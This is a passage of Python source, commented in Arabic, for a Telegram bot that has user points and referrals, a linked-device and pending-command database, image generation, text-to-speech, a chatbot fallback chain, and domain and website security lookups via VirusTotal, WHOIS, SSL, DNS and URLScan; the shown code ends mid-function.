# -*- coding: utf-8 -*-

"""
البوت النهائي - نظام ANONYMOUS_T11
الإصدار النهائي المتكامل - مع كل التعديلات والإصلاحات
"""

import os
import sys
import time
import json
import logging
import hashlib
import base64
import re
import secrets
import string
import shutil
import sqlite3
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import threading
import random
import asyncio
import socket
import ssl

import requests
import phonenumbers
from phonenumbers import geocoder, carrier
from flask import Flask, request, jsonify
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import pypdf
from bs4 import BeautifulSoup
import html
from dotenv import load_dotenv
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from PIL import Image

# استيراد whois مع محاولة catch
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    logging.warning("⚠️ python-whois غير مثبت. سيتم تخطي معلومات WHOIS.")

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== متغيرات البيئة الأساسية =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL', '')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')
HUGGINGFACE_API_KEY = os.environ.get('HUGGINGFACE_API_KEY', '')
SECURITYTRAILS_API_KEY = os.environ.get('SECURITYTRAILS_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', 'default_secret_key_please_change')
if CLIENT_SECRET_KEY == 'default_secret_key_please_change':
    logger.warning("⚠️ CLIENT_SECRET_KEY هي القيمة الافتراضية! يُرجى تغييرها.")
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry و ConnectionPool =====================
def get_requests_session(retries=5, backoff_factor=1.0, pool_connections=10, pool_maxsize=20):
    """إنشاء جلسة Requests مع إعدادات اتصال محسّنة"""
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=pool_connections,
        pool_maxsize=pool_maxsize
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS registered_devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            last_seen TEXT,
            registered_at TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_registered_devices_chat_id ON registered_devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال قاعدة البيانات =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        return c.fetchall()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM registered_devices")
        return c.fetchall()

def save_registered_device_db(device_id, chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO registered_devices 
                     (device_id, chat_id, last_seen, registered_at)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE registered_devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev['blocked_domains']:
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev['type'] and 'طفل' in dev['type']:
            history = []
            if dev['history']:
                try:
                    history = json.loads(dev['history'])
                except:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    return f"https://t.me/{(bot.get_me()).username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== دوال توليد الصور (باستخدام Hugging Face API) =====================
HUGGINGFACE_API_URL = "https://api-inference.huggingface.co/models/runwayml/stable-diffusion-v1-5"

def generate_image_huggingface(prompt):
    """توليد صورة باستخدام Hugging Face API مع Stable Diffusion"""
    if not HUGGINGFACE_API_KEY:
        return None, "⚠️ مفتاح Hugging Face غير مضبوط. يرجى إضافة HUGGINGFACE_API_KEY"
    try:
        headers = {"Authorization": f"Bearer {HUGGINGFACE_API_KEY}"}
        payload = {"inputs": prompt}
        response = REQUEST_SESSION.post(HUGGINGFACE_API_URL, headers=headers, json=payload, timeout=60)
        if response.status_code == 200:
            return response.content, None
        elif response.status_code == 503:
            # الخدمة مشغولة، ننتظر قليلاً ونعيد المحاولة
            time.sleep(5)
            response = REQUEST_SESSION.post(HUGGINGFACE_API_URL, headers=headers, json=payload, timeout=60)
            if response.status_code == 200:
                return response.content, None
            else:
                return None, f"⚠️ الخدمة مشغولة حالياً (كود {response.status_code})"
        else:
            return None, f"⚠️ فشل توليد الصورة (كود {response.status_code})"
    except Exception as e:
        logger.error(f"Hugging Face error: {e}")
        return None, f"⚠️ حدث خطأ: {str(e)[:100]}"

def generate_and_send_image(chat_id, description):
    """توليد صورة وحفظها وإرسالها مع معالجة الأخطاء"""
    temp_image_path = os.path.join(TEMP_DIR, f"image_{int(time.time())}.jpg")
    try:
        # المحاولة 1: Hugging Face
        image_data, error = generate_image_huggingface(description)
        if error and "مفتاح Hugging Face" in error:
            # إذا لم يكن المفتاح مضبوطاً، نحاول استخدام Pollinations كبديل
            return generate_image_pollinations_fallback(chat_id, description)
        elif error:
            safe_send(chat_id, f"⚠️ {error}")
            return False
        
        if not image_data:
            safe_send(chat_id, "⚠️ لم يتم استلام بيانات الصورة.")
            return False
        
        # حفظ الصورة مؤقتاً
        with open(temp_image_path, 'wb') as f:
            f.write(image_data)
        
        # التحقق من صحة الصورة
        try:
            img = Image.open(temp_image_path)
            img.verify()
            img.close()
        except Exception as e:
            logger.error(f"Pillow validation error: {e}")
            safe_send(chat_id, "⚠️ فشل التحقق من الصورة المُولَّدة. يُرجى المحاولة مرة أخرى.")
            os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
            return False
        
        # إرسال الصورة
        with open(temp_image_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption="🖼️ الصورة المُولَّدة بنجاح")
        
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return True
        
    except Exception as e:
        logger.error(f"generate_and_send_image error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني أثناء إنشاء الصورة: {str(e)[:100]}")
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return False

def generate_image_pollinations_fallback(chat_id, description):
    """استخدام Pollinations كبديل عند فشل Hugging Face"""
    temp_image_path = os.path.join(TEMP_DIR, f"image_{int(time.time())}.jpg")
    try:
        url = f"https://pollinations.ai/p/{description.replace(' ', '%20')}?width=1024&height=1024&nologo=true&seed={int(time.time())}"
        response = REQUEST_SESSION.get(url, timeout=60)
        
        if response.status_code != 200 or not response.content:
            safe_send(chat_id, "⚠️ عذراً، تعذر إنشاء الصورة المطلوبة. يُرجى المحاولة مرة أخرى.")
            return False
        
        with open(temp_image_path, 'wb') as f:
            f.write(response.content)
        
        try:
            img = Image.open(temp_image_path)
            img.verify()
            img.close()
        except Exception as e:
            logger.error(f"Pillow validation error: {e}")
            safe_send(chat_id, "⚠️ فشل التحقق من الصورة المُولَّدة. يُرجى المحاولة مرة أخرى.")
            os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
            return False
        
        with open(temp_image_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption="🖼️ الصورة المُولَّدة بنجاح")
        
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return True
    except Exception as e:
        logger.error(f"generate_image_pollinations_fallback error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني أثناء إنشاء الصورة: {str(e)[:100]}")
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return False

# ===================== دوال TTS (منفصلة لكل صوت) =====================
def clean_text_for_tts(text):
    text = re.sub(r'http\S+', '', text)
    text = re.sub(r'[^\w\s.,!؟]', '', text)
    text = re.sub(r'\s+', ' ', text).strip()
    return text

async def tts_male(text, output_path):
    """تحويل النص إلى صوت رجالي (Shakir)"""
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-EG-ShakirNeural")
    await communicate.save(output_path)

async def tts_female(text, output_path):
    """تحويل النص إلى صوت نسائي (Zari)"""
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-SA-ZariNeural")
    await communicate.save(output_path)

async def tts_child(text, output_path):
    """تحويل النص إلى صوت طفولي (Shakir مع إعدادات مختلفة)"""
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-EG-ShakirNeural")
    await communicate.save(output_path)

async def tts_scary(text, output_path):
    """تحويل النص إلى صوت مخيف (Fatima)"""
    import edge_tts
    communicate = edge_tts.Communicate(text, "ar-AE-FatimaNeural")
    await communicate.save(output_path)

VOICE_MAP = {
    "female": {
        "name": "👩 صوت أنثوي",
        "func": tts_female,
        "gtts_lang": "ar",
        "gtts_tld": "com"
    },
    "male": {
        "name": "👨 صوت ذكوري",
        "func": tts_male,
        "gtts_lang": "ar",
        "gtts_tld": "co.uk"
    },
    "child": {
        "name": "🧒 صوت طفولي",
        "func": tts_child,
        "gtts_lang": "ar",
        "gtts_tld": "co.za"
    },
    "scary": {
        "name": "👻 صوت مخيف",
        "func": tts_scary,
        "gtts_lang": "ar",
        "gtts_tld": "com.au"
    }
}

def build_voice_selection_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, val in VOICE_MAP.items():
        markup.row(InlineKeyboardButton(val["name"], callback_data=f"voice_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

def text_to_speech(text, voice_key='female'):
    """تحويل النص إلى صوت مع اختيار الصوت"""
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    clean_text = clean_text_for_tts(text)
    if not clean_text:
        return None, "⚠️ النص فارغ بعد التنظيف."
    temp_file = os.path.join(TEMP_DIR, f"tts_{int(time.time())}.mp3")
    
    try:
        # محاولة استخدام edge-tts مع الصوت المحدد
        import edge_tts
        voice_func = VOICE_MAP.get(voice_key, VOICE_MAP['female'])['func']
        asyncio.run(voice_func(clean_text, temp_file))
        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
            return temp_file, None
        else:
            if os.path.exists(temp_file):
                os.remove(temp_file)
    except Exception as e:
        logger.error(f"edge-tts error: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
    
    # المحاولة 2: gTTS (احتياطي)
    try:
        from gtts import gTTS
        voice = VOICE_MAP.get(voice_key, VOICE_MAP['female'])
        tts = gTTS(text=clean_text, lang=voice["gtts_lang"], tld=voice["gtts_tld"], slow=False)
        tts.save(temp_file)
        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
            return temp_file, None
        else:
            return None, "⚠️ فشل توليد الصوت عبر gTTS."
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None, f"⚠️ فشل تحويل النص إلى صوت: {str(e)[:100]}"

# ===================== دوال الخدمات الأخرى =====================

# 1. المساعد الذكي
def get_ai_response(prompt):
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = REQUEST_SESSION.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data and 'response' in data:
                return data['response']
    except Exception as e:
        logger.error(f"Popcat API error: {e}")
    try:
        alt_url = f"https://some-random-api.com/chatbot/response?message={requests.utils.quote(prompt)}"
        alt_response = REQUEST_SESSION.get(alt_url, timeout=15)
        if alt_response.status_code == 200:
            alt_data = alt_response.json()
            if alt_data and 'response' in alt_data:
                return alt_data['response']
    except Exception as e:
        logger.error(f"Some Random API error: {e}")
    if GEMINI_API_KEY:
        try:
            import google.generativeai as genai
            genai.configure(api_key=GEMINI_API_KEY)
            model = genai.GenerativeModel('gemini-pro')
            response = model.generate_content(prompt)
            if response.text:
                return response.text
        except Exception as e:
            logger.error(f"Gemini API error: {e}")
    return "🤖 عذراً، جميع محاولات الاتصال بخدمات الذكاء الاصطناعي قد فشلت في الوقت الحالي. يُرجى المحاولة مرة أخرى لاحقاً."

# ===================== دوال محسّنة لفحص المواقع والنطاقات =====================

def get_domain_whois(domain):
    """جلب معلومات WHOIS للنطاق باستخدام python-whois"""
    if not WHOIS_AVAILABLE:
        return None
    try:
        w = whois.whois(domain)
        info = {}
        if w.name:
            info['اسم_النطاق'] = w.name
        if w.registrar:
            info['المسجل'] = w.registrar
        if w.creation_date:
            # قد تكون قائمة أو مفردة
            if isinstance(w.creation_date, list):
                info['تاريخ_الإنشاء'] = w.creation_date[0].strftime('%Y-%m-%d')
            else:
                info['تاريخ_الإنشاء'] = w.creation_date.strftime('%Y-%m-%d')
        if w.expiration_date:
            if isinstance(w.expiration_date, list):
                info['تاريخ_الانتهاء'] = w.expiration_date[0].strftime('%Y-%m-%d')
            else:
                info['تاريخ_الانتهاء'] = w.expiration_date.strftime('%Y-%m-%d')
        if w.country:
            info['البلد'] = w.country
        if w.org:
            info['المنظمة'] = w.org
        if w.emails:
            info['البريد_الإلكتروني'] = ', '.join(w.emails[:3])
        return info
    except Exception as e:
        logger.error(f"WHOIS error for {domain}: {e}")
        return None

def get_ssl_info(domain):
    """جلب معلومات شهادة SSL للنطاق"""
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                info = {}
                info['المصدر'] = dict(x[0] for x in cert.get('issuer', [])) if cert.get('issuer') else None
                info['الموضوع'] = dict(x[0] for x in cert.get('subject', [])) if cert.get('subject') else None
                info['تاريخ_الانتهاء'] = cert.get('notAfter')
                info['تاريخ_البدء'] = cert.get('notBefore')
                info['الإصدار'] = cert.get('version')
                # استخراج CN
                if info['الموضوع']:
                    info['CN'] = info['الموضوع'].get('commonName')
                return info
    except Exception as e:
        logger.error(f"SSL error for {domain}: {e}")
        return None

def get_dns_records(domain):
    """جلب سجلات DNS الأساسية (A, MX, NS)"""
    records = {}
    try:
        # A record
        import socket
        try:
            ip = socket.gethostbyname(domain)
            records['A'] = ip
        except:
            pass
        # NS records - باستخدام dns.resolver إذا كان متاحاً
        try:
            import dns.resolver
            ns = dns.resolver.resolve(domain, 'NS')
            records['NS'] = [str(r) for r in ns]
        except:
            pass
        # MX records
        try:
            import dns.resolver
            mx = dns.resolver.resolve(domain, 'MX')
            records['MX'] = [str(r.exchange) for r in mx]
        except:
            pass
    except Exception as e:
        logger.error(f"DNS error for {domain}: {e}")
    return records

def check_domain_virustotal(domain):
    """فحص النطاق باستخدام VirusTotal ومصادر أخرى، مع تقرير مفصل"""
    result_lines = []
    result_lines.append(f"🌐 **تحليل النطاق:** `{domain}`")
    result_lines.append("")

    # 1. VirusTotal
    vt_result = None
    if VIRUSTOTAL_API_KEY:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}"
            headers = {"x-apikey": VIRUSTOTAL_API_KEY}
            response = REQUEST_SESSION.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                attrs = data.get('data', {}).get('attributes', {})
                stats = attrs.get('last_analysis_stats', {})
                vt_result = {
                    'malicious': stats.get('malicious', 0),
                    'suspicious': stats.get('suspicious', 0),
                    'harmless': stats.get('harmless', 0),
                    'undetected': stats.get('undetected', 0),
                    'reputation': attrs.get('reputation', 0),
                    'categories': attrs.get('categories', {})
                }
        except Exception as e:
            logger.error(f"VirusTotal error: {e}")

    if vt_result:
        result_lines.append("📊 **نتائج VirusTotal:**")
        result_lines.append(f"   • ضار: {vt_result['malicious']}")
        result_lines.append(f"   • مشبوه: {vt_result['suspicious']}")
        result_lines.append(f"   • آمن: {vt_result['harmless']}")
        result_lines.append(f"   • غير مكتشف: {vt_result['undetected']}")
        if vt_result['categories']:
            cats = ', '.join(vt_result['categories'].values())
            result_lines.append(f"   • التصنيفات: {cats}")
        result_lines.append("")
    else:
        result_lines.append("⚠️ **VirusTotal:** لم تتوفر نتائج (قد يكون المفتاح غير مضبوط أو النطاق غير موجود).")
        result_lines.append("")

    # 2. WHOIS
    whois_info = get_domain_whois(domain)
    if whois_info:
        result_lines.append("📋 **معلومات WHOIS:**")
        for key, value in whois_info.items():
            if value:
                result_lines.append(f"   • {key}: {value}")
        result_lines.append("")

    # 3. SSL
    ssl_info = get_ssl_info(domain)
    if ssl_info:
        result_lines.append("🔒 **معلومات SSL/TLS:**")
        if ssl_info.get('CN'):
            result_lines.append(f"   • الاسم الشائع (CN): {ssl_info['CN']}")
        if ssl_info.get('تاريخ_الانتهاء'):
            result_lines.append(f"   • تاريخ الانتهاء: {ssl_info['تاريخ_الانتهاء']}")
        if ssl_info.get('المصدر'):
            issuer = ssl_info['المصدر']
            if 'organizationName' in issuer:
                result_lines.append(f"   • الجهة المصدرة: {issuer['organizationName']}")
        result_lines.append("")

    # 4. DNS
    dns_records = get_dns_records(domain)
    if dns_records:
        result_lines.append("🌍 **سجلات DNS:**")
        if 'A' in dns_records:
            result_lines.append(f"   • A (IPv4): {dns_records['A']}")
        if 'NS' in dns_records:
            ns_list = ', '.join(dns_records['NS'])
            result_lines.append(f"   • NS: {ns_list}")
        if 'MX' in dns_records:
            mx_list = ', '.join(dns_records['MX'])
            result_lines.append(f"   • MX: {mx_list}")
        result_lines.append("")

    # 5. تقييم عام
    if vt_result and vt_result['malicious'] > 0:
        result_lines.append("🚨 **تقييم الأمان: ضار (تم اكتشاف تهديدات)**")
    elif vt_result and vt_result['suspicious'] > 0:
        result_lines.append("⚠️ **تقييم الأمان: مشبوه (يُنصح بالحذر)**")
    elif vt_result:
        result_lines.append("✅ **تقييم الأمان: آمن (لم يتم اكتشاف تهديدات)**")
    else:
        result_lines.append("ℹ️ **تقييم الأمان: غير معروف (تعذر الحصول على معلومات كافية)**")

    return "\n".join(result_lines)

def check_website_security(url):
    """فحص أمان الموقع باستخدام URLScan.io وفحص مباشر"""
    result_lines = []
    result_lines.append(f"🔍 **فحص أمان الموقع:** `{url}`")
    result_lines.append("")

    # 1. URLScan.io
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = REQUEST_SESSION.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(5)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = REQUEST_SESSION.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    if verdicts.get('malicious', False):
                        result_lines.append("🚨 **URLScan.io:** الموقع يحتوي على تهديدات مؤكدة!")
                    elif verdicts.get('suspicious', False):
                        result_lines.append("⚠️ **URLScan.io:** الموقع مشبوه!")
                    else:
                        result_lines.append("✅ **URLScan.io:** الموقع آمن.")
                    # إضافة معلومات إضافية
                    if 'countries' in verdicts:
                        result_lines.append(f"   • البلدان: {', '.join(verdicts['countries'])}")
                    result_lines.append("")
    except Exception as e:
        logger.error(f"URLScan error: {e}")

    # 2. فحص مباشر للموقع
    try:
        response = REQUEST_SESSION.get(url, timeout=10, allow_redirects=True, verify=True)
        result_lines.append(f"📡 **الفحص المباشر:**")
        result_lines.append(f"   • حالة HTTP: {response.status_code} ({response.reason})")
        # headers
        headers = response.headers
        if 'Server' in headers:
            result_lines.append(f"   • الخادم: {headers['Server']}")
        if 'X-Powered-By' in headers:
            result_lines.append(f"   • التقنية: {headers['X-Powered-By']}")
        if 'Content-Type' in headers:
            result_lines.append(f"   • نوع المحتوى: {headers['Content-Type']}")
        # تحليل HTML
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string.strip() if soup.title else "لا يوجد عنوان"
            result_lines.append(f"   • عنوان الصفحة: {title}")
            # وصف meta
            desc = soup.find('meta', {'name': 'description'})
            if desc:
                desc_content = desc.get('content', '').strip()
                if desc_content:
                    result_lines.append(f"   • الوصف: {desc_content[:100]}...")
            # كلمات مفتاحية
            keywords = soup.find('meta', {'name': 'keywords'})
            if keywords:
                kw = keywords.get('content', '').strip()
                if kw:
